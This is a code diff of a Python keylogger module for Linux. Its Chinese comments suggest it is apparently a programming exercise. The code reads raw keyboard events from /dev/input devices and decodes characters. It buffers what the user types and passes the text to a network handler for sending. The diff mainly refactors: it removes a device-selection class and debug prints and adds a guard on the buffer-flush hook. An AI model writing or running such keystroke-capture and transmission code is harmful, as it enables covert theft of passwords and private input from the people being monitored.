@@ -7,6 +7,7 @@ from evdev import InputDevice
 from select import select
 from evdev import ecodes
 from evdev.events import KeyEvent
+from functools import partial
 
 sys.path.append("../")
 from utils import word_ctoa, special_character_handler
@@ -15,29 +16,6 @@ from keylogger import virtual_thread_func
 
 # linux下的系统输入设备信息目录
 DEVICES_PATH = '/sys/class/input/'
-
-
-class DeviceFactory(object):
-    DEV_PATH = "/dev/input/"
-    VIR_PATH = "/dev/pts"
-
-    @classmethod
-    def find_available_devices(cls):
-        """
-        根据当前系统环境判断从哪里获取输入设备：
-            1. 在docker实验环境中， 没有物理输入设备， 即/dev/input/ 目录不存在
-               此时只能通过 /dev/pst/ 下的终端来获取系统的输入
-            2. 在实际的linux物理机和vmware, xvbox的虚拟机下，我们通过/dev/input下的输入设备
-               来记录用户的键盘操作
-        """
-        # 判断程序运行的平台,如果不是linux直接退出
-        if "linux" not in sys.platform:
-            print("该程序只能运行在linux系统下")
-            sys.exit(-1)
-        if not os.path.exists(cls.DEV_PATH):
-            return monitor_keyboard(find_keyboard_devices(device_filter))
-        else:
-            return virtual_thread_func()
 
 
 class CusKeyEvent(KeyEvent):
@@ -222,8 +200,6 @@ def content_handler(net_work_handler, hook_func, str_cached_length=10):
        当输入的内容比较长时，是会严重影响性能的
        我已经帮你定义了content_length， 请完善char_handler函数
        使用content_length来代替len(input_str_content)
-       python2的闭包支持不完整，要改变外面的值，只能使用list 和dict对象
-       python3使用nonlocal关键词
     """
     input_str_content = []
     postion = [None, ]
@@ -232,8 +208,7 @@ def content_handler(net_work_handler, hook_func, str_cached_length=10):
     # hook_func 是为了保证缓冲区数据全部被发送出去
     def __hook_func():
         if input_str_content:
-            print "hook", input_str_content, '\n'
-            ret = net_work_handler("".join(input_str_content))
+            net_work_handler("".join(input_str_content))
     hook_func[0] = __hook_func
 
     def char_handler(in_str):
@@ -277,14 +252,10 @@ def content_handler(net_work_handler, hook_func, str_cached_length=10):
             input_str_content[:] = []
 
         # TODO content_length + 1
-
     return char_handler
 
 
 def linux_thread_func(file_name, file_type, content_handler, seconds=10):
-    # 物理机中使用/dev/input/xx键盘设备文件
-    # 在docker中 使用x11库来记录,
-    # devices = DeviceFactory.find_available_devices()
     devices = monitor_keyboard(find_keyboard_devices(device_filter))
     # 维护shift和caps状态， 对evdev库的event对象进行解析
     dec = decode_character()
@@ -298,7 +269,6 @@ def linux_thread_func(file_name, file_type, content_handler, seconds=10):
 
     now_t = time.time()
     while True:
- 	print "get in"
         if int(time.time() - now_t) >= seconds:
             break
         # select 是监听文件描述符的一个库
@@ -316,12 +286,13 @@ def linux_thread_func(file_name, file_type, content_handler, seconds=10):
                         # 将当前字符加入到缓存区，并执行相关的缓冲区操作
                         char_handler(ret_char)
     # 处理缓冲区剩余的数据
-    hook_handler[0]()
+    if hook_handler[0]:
+        hook_handler[0]()
     # 发送任务结束的消息
     text_task.send_stop_message()
 
-from functools import partial
-linux_thread_func = partial(linux_thread_func, content_handler=content_handler) 
+
+linux_thread_func = partial(linux_thread_func, content_handler=content_handler)
 if __name__ == '__main__':
     linux_thread_func("test", "txt", seconds=3)
-  # virtual_thread_func("test", "txt")
+    # virtual_thread_func("test", "txt")
